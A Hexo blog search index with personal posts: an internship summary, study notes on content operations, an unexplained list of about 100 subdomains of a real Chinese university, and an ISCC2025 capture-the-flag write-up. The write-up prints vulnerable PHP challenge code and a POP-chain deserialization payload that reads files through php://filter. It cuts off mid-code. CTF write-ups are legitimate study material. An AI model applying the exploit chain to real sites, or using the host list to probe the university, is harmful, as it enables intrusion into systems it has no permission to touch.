<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>360实习总结</title>
    <link href="/2025/08/25/360%E5%AE%9E%E4%B9%A0/"/>
    <url>/2025/08/25/360%E5%AE%9E%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h3 id="新媒体安全运营实习生"><a href="#新媒体安全运营实习生" class="headerlink" title="新媒体安全运营实习生"></a><strong>新媒体安全运营实习生</strong></h3><p><strong>实习时间：</strong> 2025年6月 - 2025年8月<br><strong>工作地点：</strong> 北京<br><strong>所属部门：</strong> 安全用户增长组</p><h4 id="工作职责描述："><a href="#工作职责描述：" class="headerlink" title="工作职责描述："></a><strong>工作职责描述：</strong></h4><ul><li>独立负责<strong>360安全浏览器</strong>官方小红书、微信公众号的日常内容策划、撰写、排版与发布，实习期间双平台总粉丝量增长<strong>5%</strong>（约<strong>1万</strong>）。</li><li>策划并执行 <strong>#网络安全知多少#</strong> 微博话题活动，通过有奖互动、知识科普等形式，单周话题阅读量增长<strong>50万+</strong>，参与用户超<strong>1.2万</strong>人次，成功引导App下载约<strong>300次</strong>。</li><li>监测小红书、知乎等新兴平台内容趋势，撰写3篇深度科普文章（如《一招教你识别钓鱼WiFi》、《个人隐私泄露的N个隐藏陷阱》），其中一篇被知乎官方收录，获得自然流量<strong>4万+</strong> 阅读。</li><li>每周使用<strong>推推</strong>、Excel等工具进行数据复盘，分析内容阅读量、互动率、转化率等核心指标，并撰写数据报告，为内容策略优化提供数据支持，使平均互动率提升<strong>约7%</strong>。</li><li>协助团队完成竞品动态监测，定期输出分析报告，跟踪同行如QQ浏览器、UC浏览器的运营策略。</li></ul><p><img src="/../images/3622cb10d2be70c9754dbd82876e24d2.jpg" alt="3622cb10d2be70c9754dbd82876e24d2"></p><p><img src="/../images/44af7676c1e2accd9a7a7cf77b3259f1_720.jpg" alt="44af7676c1e2accd9a7a7cf77b3259f1_720"></p><p><img src="/../images/8a06dbc57fb091568eb4d0575d3f4d0f.jpg" alt="8a06dbc57fb091568eb4d0575d3f4d0f"></p><p><img src="/../images/5583d0964a3d6fbe3455adb817e41107.jpg" alt="5583d0964a3d6fbe3455adb817e41107"></p><p><img src="/../images/7894d470a5b17411c70e8d2f419a66a5.jpg" alt="7894d470a5b17411c70e8d2f419a66a5"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2025/08/25/Untitled%201/"/>
    <url>/2025/08/25/Untitled%201/</url>
    
    <content type="html"><![CDATA[<p><a href="https://yyxy.fafu.edu.cn/">yyxy.fafu.edu.cn</a><br><a href="https://xsg.fafu.edu.cn/">xsg.fafu.edu.cn</a><br><a href="https://libook.fafu.edu.cn/">libook.fafu.edu.cn</a><br><a href="https://dzjc.fafu.edu.cn/">dzjc.fafu.edu.cn</a><br><a href="https://qytszk.fafu.edu.cn/">qytszk.fafu.edu.cn</a><br><a href="https://jssfhy.fafu.edu.cn/">jssfhy.fafu.edu.cn</a><br><a href="https://cgzb.fafu.edu.cn/">cgzb.fafu.edu.cn</a><br><a href="https://gateway.fafu.edu.cn/">gateway.fafu.edu.cn</a><br><a href="https://dev.fafu.edu.cn/">dev.fafu.edu.cn</a><br><a href="https://jxlxnfz.fafu.edu.cn/">jxlxnfz.fafu.edu.cn</a><br><a href="https://mab.fafu.edu.cn/">mab.fafu.edu.cn</a><br><a href="https://m.fafu.edu.cn/">m.fafu.edu.cn</a><br><a href="https://bioinformatics.fafu.edu.cn/">bioinformatics.fafu.edu.cn</a><br><a href="https://ipis.fafu.edu.cn/">ipis.fafu.edu.cn</a><br><a href="https://qmblj.fafu.edu.cn/">qmblj.fafu.edu.cn</a><br><a href="https://gjxy.fafu.edu.cn/">gjxy.fafu.edu.cn</a><br><a href="https://jsxyjwgl.fafu.edu.cn/">jsxyjwgl.fafu.edu.cn</a><br><a href="https://jwgl.webvpn.fafu.edu.cn/">jwgl.webvpn.fafu.edu.cn</a><br><a href="https://meeting.fafu.edu.cn/">meeting.fafu.edu.cn</a><br><a href="https://xsc.fafu.edu.cn/">xsc.fafu.edu.cn</a><br><a href="https://fifi.fafu.edu.cn/">fifi.fafu.edu.cn</a><br><a href="https://ysylxy.fafu.edu.cn/">ysylxy.fafu.edu.cn</a><br><a href="https://tzb.fafu.edu.cn/">tzb.fafu.edu.cn</a><br><a href="https://zhxy.fafu.edu.cn/">zhxy.fafu.edu.cn</a><br><a href="https://webvpn.fafu.edu.cn/">webvpn.fafu.edu.cn</a><br><a href="https://ybt.fafu.edu.cn/">ybt.fafu.edu.cn</a><br><a href="https://jxcg.fafu.edu.cn/">jxcg.fafu.edu.cn</a><br><a href="https://xjbd.fafu.edu.cn/">xjbd.fafu.edu.cn</a><br><a href="https://esop.fafu.edu.cn/">esop.fafu.edu.cn</a><br><a href="https://apis.fafu.edu.cn/">apis.fafu.edu.cn</a><br><a href="https://card.fafu.edu.cn/">card.fafu.edu.cn</a><br><a href="https://jcc5.fafu.edu.cn/">jcc5.fafu.edu.cn</a><br><a href="https://xy.fafu.edu.cn/">xy.fafu.edu.cn</a><br><a href="https://giving.fafu.edu.cn/">giving.fafu.edu.cn</a><br><a href="https://cjdyz.fafu.edu.cn/">cjdyz.fafu.edu.cn</a><br><a href="https://chst.fafu.edu.cn/">chst.fafu.edu.cn</a><br><a href="https://hwzy.fafu.edu.cn/">hwzy.fafu.edu.cn</a><br><a href="https://iportal.fafu.edu.cn/">iportal.fafu.edu.cn</a><br><a href="https://jwsj.fafu.edu.cn/">jwsj.fafu.edu.cn</a><br><a href="https://app.fafu.edu.cn/">app.fafu.edu.cn</a><br><a href="https://cwc.fafu.edu.cn/">cwc.fafu.edu.cn</a><br><a href="https://dektmapi.fafu.edu.cn/">dektmapi.fafu.edu.cn</a><br><a href="https://dektapi.fafu.edu.cn/">dektapi.fafu.edu.cn</a><br><a href="https://agri.fafu.edu.cn/">agri.fafu.edu.cn</a><br><a href="https://adhttp.fafu.edu.cn/">adhttp.fafu.edu.cn</a><br><a href="https://access.fafu.edu.cn/">access.fafu.edu.cn</a><br><a href="https://isc.fafu.edu.cn/">isc.fafu.edu.cn</a><br><a href="https://hqc.fafu.edu.cn/">hqc.fafu.edu.cn</a><br><a href="https://gwyc.fafu.edu.cn/">gwyc.fafu.edu.cn</a><br><a href="https://zb.fafu.edu.cn/">zb.fafu.edu.cn</a><br><a href="https://hq.fafu.edu.cn/">hq.fafu.edu.cn</a><br><a href="https://nercs.fafu.edu.cn/">nercs.fafu.edu.cn</a><br><a href="https://www.rcgl.fafu.edu.cn/">www.rcgl.fafu.edu.cn</a><br><a href="https://clxy.fafu.edu.cn/">clxy.fafu.edu.cn</a><br><a href="https://wlsyzx.fafu.edu.cn/">wlsyzx.fafu.edu.cn</a><br><a href="https://skxy.fafu.edu.cn/">skxy.fafu.edu.cn</a><br><a href="https://sjgl.fafu.edu.cn/">sjgl.fafu.edu.cn</a><br><a href="https://jsxyjwc.fafu.edu.cn/">jsxyjwc.fafu.edu.cn</a><br><a href="https://english.fafu.edu.cn/">english.fafu.edu.cn</a><br><a href="https://xxxy.fafu.edu.cn/">xxxy.fafu.edu.cn</a><br><a href="https://oj.fafu.edu.cn/">oj.fafu.edu.cn</a><br><a href="https://oa.fafu.edu.cn/">oa.fafu.edu.cn</a><br><a href="https://self.fafu.edu.cn/">self.fafu.edu.cn</a><br><a href="https://rcgl.fafu.edu.cn/">rcgl.fafu.edu.cn</a><br><a href="https://zsb.fafu.edu.cn/">zsb.fafu.edu.cn</a><br><a href="https://yjsjyglxt.fafu.edu.cn/">yjsjyglxt.fafu.edu.cn</a><br><a href="https://jsxyrwxrccp.fafu.edu.cn/">jsxyrwxrccp.fafu.edu.cn</a><br><a href="https://auth.fafu.edu.cn/">auth.fafu.edu.cn</a><br><a href="https://dns1.fafu.edu.cn/">dns1.fafu.edu.cn</a><br><a href="https://acm.fafu.edu.cn/">acm.fafu.edu.cn</a><br><a href="https://libic.fafu.edu.cn/">libic.fafu.edu.cn</a><br><a href="https://jwjc.fafu.edu.cn/">jwjc.fafu.edu.cn</a><br><a href="https://jtxy.fafu.edu.cn/">jtxy.fafu.edu.cn</a><br><a href="https://yjsy.fafu.edu.cn/">yjsy.fafu.edu.cn</a><br><a href="https://zscq.fafu.edu.cn/">zscq.fafu.edu.cn</a><br><a href="https://jwca.fafu.edu.cn/">jwca.fafu.edu.cn</a><br><a href="https://wfxy.fafu.edu.cn/">wfxy.fafu.edu.cn</a><br><a href="https://rsc.fafu.edu.cn/">rsc.fafu.edu.cn</a><br><a href="https://jgdw.fafu.edu.cn/">jgdw.fafu.edu.cn</a><br><a href="https://gzc.fafu.edu.cn/">gzc.fafu.edu.cn</a><br><a href="https://tw.fafu.edu.cn/">tw.fafu.edu.cn</a><br><a href="https://xsh.fafu.edu.cn/">xsh.fafu.edu.cn</a><br><a href="https://glxy.fafu.edu.cn/">glxy.fafu.edu.cn</a><br><a href="https://jjxy.fafu.edu.cn/">jjxy.fafu.edu.cn</a><br><a href="https://career.fafu.edu.cn/">career.fafu.edu.cn</a><br><a href="https://zbxy.fafu.edu.cn/">zbxy.fafu.edu.cn</a><br><a href="https://jdxy.fafu.edu.cn/">jdxy.fafu.edu.cn</a><br><a href="https://jsxy.fafu.edu.cn/">jsxy.fafu.edu.cn</a><br><a href="https://mksxy.fafu.edu.cn/">mksxy.fafu.edu.cn</a><br><a href="https://lxy.fafu.edu.cn/">lxy.fafu.edu.cn</a><br><a href="https://spxy.fafu.edu.cn/">spxy.fafu.edu.cn</a><br><a href="https://ggxy.fafu.edu.cn/">ggxy.fafu.edu.cn</a><br><a href="https://hwxy.fafu.edu.cn/">hwxy.fafu.edu.cn</a><br><a href="https://kyy.fafu.edu.cn/">kyy.fafu.edu.cn</a><br><a href="https://jwc.fafu.edu.cn/">jwc.fafu.edu.cn</a><br><a href="https://dkxy.fafu.edu.cn/">dkxy.fafu.edu.cn</a><br><a href="https://xxzx.fafu.edu.cn/">xxzx.fafu.edu.cn</a><br><a href="https://exam.fafu.edu.cn/">exam.fafu.edu.cn</a><br><a href="https://cjxy.fafu.edu.cn/">cjxy.fafu.edu.cn</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>运营工具</title>
    <link href="/2025/07/31/4%E4%B8%AA%E9%97%AE%E9%A2%98+2%E7%B1%BB%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%BF%85%E9%80%9F%E6%8E%8C%E6%8F%A1%E8%BF%90%E8%90%A5%E4%BD%93%E7%B3%BB/"/>
    <url>/2025/07/31/4%E4%B8%AA%E9%97%AE%E9%A2%98+2%E7%B1%BB%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%BF%85%E9%80%9F%E6%8E%8C%E6%8F%A1%E8%BF%90%E8%90%A5%E4%BD%93%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="4个问题-2类工具，迅速掌握运营体系"><a href="#4个问题-2类工具，迅速掌握运营体系" class="headerlink" title="4个问题+2类工具，迅速掌握运营体系"></a>4个问题+2类工具，迅速掌握运营体系</h1><p><img src="/../images/2d163153-7d27-42f7-8fe2-7cb223ffd34c.png" alt="2d163153-7d27-42f7-8fe2-7cb223ffd34c"></p><h3 id="2类工具"><a href="#2类工具" class="headerlink" title="2类工具"></a><strong>2类工具</strong></h3><p><strong>运营软件、运营平台</strong></p><p><strong>运营软件（<img src="C:/Users/75192/AppData/Local/Temp/377e6be9-9bed-4d1e-b0ff-4ead71010f45.png" alt="377e6be9-9bed-4d1e-b0ff-4ead71010f45">仅列出主流的一部分软件)：</strong></p><p><img src="/../images/fb4e2cec-102c-48f9-9276-aff5992ebb63.png" alt="fb4e2cec-102c-48f9-9276-aff5992ebb63"></p><p><strong>运营平台（仅列出主流的一部分平台）：</strong></p><p><img src="/../images/d656deee-614a-40fa-81d4-76840ea7ca7e.png" alt="d656deee-614a-40fa-81d4-76840ea7ca7e"></p><p>总结：运营工具总类多，皆为提高运营效率</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>运营学习目标与计划</title>
    <link href="/2025/06/16/%E8%BF%90%E8%90%A5%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87%E4%B8%8E%E8%AE%A1%E5%88%92/"/>
    <url>/2025/06/16/%E8%BF%90%E8%90%A5%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87%E4%B8%8E%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h1 id="一、本学期目标"><a href="#一、本学期目标" class="headerlink" title="一、本学期目标"></a>一、本学期目标</h1><p>全平台粉丝一年内超过3000个</p><h1 id="二、学习内容"><a href="#二、学习内容" class="headerlink" title="二、学习内容"></a>二、学习内容</h1><h2 id="2-1、整体计划"><a href="#2-1、整体计划" class="headerlink" title="2.1、整体计划"></a>2.1、整体计划</h2><p><strong>第一阶段：视频文案编写</strong></p><ol><li><p><strong>基础培训</strong></p><p>文案写作基础、创意构思、叙事技巧。</p></li><li><p><strong>实战练习</strong></p><p>围绕不同主题撰写短视频脚本。</p></li></ol><p><strong>第二阶段：视频剪辑软件的使用</strong></p><ol><li><p><strong>软件培训</strong></p><p>常用剪辑软件（如Premiere、Final Cut Pro）的基础操作和高级功能。</p></li><li><p><strong>实战练习</strong></p><p>拍摄素材并进行剪辑制作。</p></li></ol><p><strong>第三阶段：视频运营方法</strong></p><ol><li><p><strong>运营理论</strong></p><p>短视频平台算法、流量获取策略、用户互动方法。</p></li><li><p><strong>运营实战</strong></p><p>模拟短视频发布、推广和数据分析。</p></li></ol><h2 id="2-2、文案编写"><a href="#2-2、文案编写" class="headerlink" title="2.2、文案编写"></a>2.2、文案编写</h2><h3 id="2-2-1、常用网站"><a href="#2-2-1、常用网站" class="headerlink" title="2.2.1、常用网站"></a>2.2.1、常用网站</h3><p> <a href="https://www.aigc.cn/">https://www.aigc.cn/</a></p><p><a href="https://kimi.moonshot.cn/">https://kimi.moonshot.cn/</a></p><p><a href="https://www.doubao.com/chat/">https://www.doubao.com/chat/</a></p><h3 id="2-2-2、短视频文案的定义与特点"><a href="#2-2-2、短视频文案的定义与特点" class="headerlink" title="2.2.2、短视频文案的定义与特点"></a>2.2.2、短视频文案的定义与特点</h3><p>短视频文案是指为短视频内容撰写的文字说明，它不仅要简洁明了，还要抓住观众的注意力。短视频的特点是时间短、信息量大，因此，文案必须在有限的时间内迅速传达核心信息，激发观众的兴趣。这就需要我们掌握一些关键的写作方法。</p><h3 id="写作方法"><a href="#写作方法" class="headerlink" title="写作方法"></a>写作方法</h3><ol><li>引人入胜的开头：开头要有冲击力，能够吸引观众的注意。例如，可以使用问题、惊人的事实或者幽默的语句来引起兴趣。</li><li>使用<a href="https://zhida.zhihu.com/search?content_id=248983449&content_type=Article&match_order=1&q=%E7%94%9F%E5%8A%A8%E7%9A%84%E8%AF%AD%E8%A8%80&zhida_source=entity">生动的语言</a>：用形象的比喻和生动的描述让观众产生共鸣。例如，“这款口红就像是秋天的第一片枫叶，温暖而迷人。”</li><li>明确的行动呼吁：文案的最后要有明确的行动指引，让观众知道接下来该做什么，比如“快来试试吧！”或者“别错过这个机会！”</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCC2025</title>
    <link href="/2025/05/13/ISCC2025/"/>
    <url>/2025/05/13/ISCC2025/</url>
    
    <content type="html"><![CDATA[<p>这次比赛难度适中，唯一可惜校赛web信仰之下脑洞太大，xss没解出来，全国总决赛排名在第三十九（下次争取更好）</p><h1 id="决赛部分"><a href="#决赛部分" class="headerlink" title="决赛部分"></a>决赛部分</h1><h2 id="谁动了我的奶酪？"><a href="#谁动了我的奶酪？" class="headerlink" title="谁动了我的奶酪？"></a>谁动了我的奶酪？</h2><p>直接输入汤姆猫得到题目源代码</p><p><em>据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！&quot;</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tom</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$stolenCheese</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$trap</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;cheesemap.php&#x27;</span></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;stolenCheese = <span class="hljs-variable">$file</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Tom盯着你，想要守住他抢走的奶酪！&quot;</span>.<span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">revealCheeseLocation</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;stolenCheese)&#123;<br> <span class="hljs-variable">$cheeseGuardKey</span> = <span class="hljs-string">&quot;cheesemap.php&quot;</span>;<br> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">nl2br</span>(<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;stolenCheese)));<br> <span class="hljs-variable language_">$this</span>-&gt;stolenCheese = <span class="hljs-title function_ invoke__">str_rot3</span>(<span class="hljs-variable">$cheeseGuardKey</span>);<br> &#125;<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toString</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>]) || <span class="hljs-variable">$SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>] !== <span class="hljs-string">&quot;JerryBrowser&quot;</span>) &#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Tom 盯着你的浏览器，觉得它不太对劲……&quot;</span>;<br> &#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;trap[<span class="hljs-string">&#x27;trap&#x27;</span>]-&gt;stolenCheese;<br> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Tom&quot;</span>;<br> &#125;<br> &#125;<br> <br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stoleCheese</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable">$Messages</span> = [<br> <span class="hljs-string">&quot;Tom偷偷看了你一眼，然后继续啃奶酪...&quot;</span>,<br> <span class="hljs-string">&quot;墙角的奶酪碎屑消失了，它们去了哪里？&quot;</span>,<br> <span class="hljs-string">&quot;Cheese的香味越来越浓，谁在偷吃？&quot;</span>,<br> <span class="hljs-string">&quot;Jerry皱了皱眉，似乎察觉到了什么异常……&quot;</span>,<br> ];<br> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$Messages</span>[<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-variable">$Messages</span>)];<br> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">revealCheeseLocation</span>();<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123;<br> <span class="hljs-keyword">protected</span> <span class="hljs-variable">$secretHidingSpot</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchForCheese</span>(<span class="hljs-params"><span class="hljs-variable">$mouseHole</span></span>)</span>&#123;<br> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$mouseHole</span>);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">searchForCheese</span>(<span class="hljs-variable">$this</span>-&gt;secretHidingSpot);<br> &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheese</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$flavors</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">construct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-variable language_">$this</span>-&gt;flavors = <span class="hljs-keyword">array</span>();<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$slice</span></span>)</span>&#123;<br> <span class="hljs-variable">$melt</span> = <span class="hljs-variable language_">$this</span>-&gt;flavors;<br> <span class="hljs-keyword">return</span> <span class="hljs-variable">$melt</span>();<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;color)();<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Where is my cheese?&quot;</span>;<br> &#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;cheese_tracker&#x27;</span>])) &#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&#x27;cheese_tracker&#x27;</span>]);<br>&#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;clue&quot;</span>]))&#123;<br> <span class="hljs-variable">$clue</span> = <span class="hljs-variable">$GET</span>[<span class="hljs-string">&quot;clue&quot;</span>];<br> <span class="hljs-variable">$clue</span> = <span class="hljs-title function_ invoke__">str_replace</span>([<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;！&quot;</span>], <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-variable">$clue</span>);<br> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>))&#123;<br> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;squeak = <span class="hljs-string">&quot;Thief!&quot;</span>;<br> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;shout === <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$clue</span>)-&gt;squeak)<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;cheese is hidden in &quot;</span>.<span class="hljs-variable">$where</span>;<br> <span class="hljs-keyword">else</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;OHhhh no!find it yourself!&quot;</span>;<br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>绕过clue检测得到文件位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123; <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$secretHidingSpot</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">searchForCheese</span>(<span class="hljs-params"><span class="hljs-variable">$mouseHole</span></span>)</span>&#123; <br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$mouseHole</span>); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">searchForCheese</span>(<span class="hljs-variable">$this</span>-&gt;secretHidingSpot); <br>    &#125; <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Jerry</span>())); <br><br></code></pre></td></tr></table></figure><p><img src="/%5Cimages%5CISCC1.png"></p><p>文件位置所在<code>cheese is hidden in flag_of_cheese.php</code></p><p>构造pop链子利用include函数去读取此文件，链子就触发到 **destruct()**<strong>再到</strong>invoke()就能触发到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;据目击鼠鼠称，那Tom坏猫确实拿了一块儿奶酪，快去找找吧！&lt;/h2&gt;&quot;</span>; <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jerry</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$secretHidingSpot</span>=<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag_of_cheese.php&#x27;</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$squeak</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shout</span>; <br>&#125; <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cheese</span></span>&#123; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flavors</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$color</span>; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;flavors = <span class="hljs-keyword">array</span>(); <br>    &#125; <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span 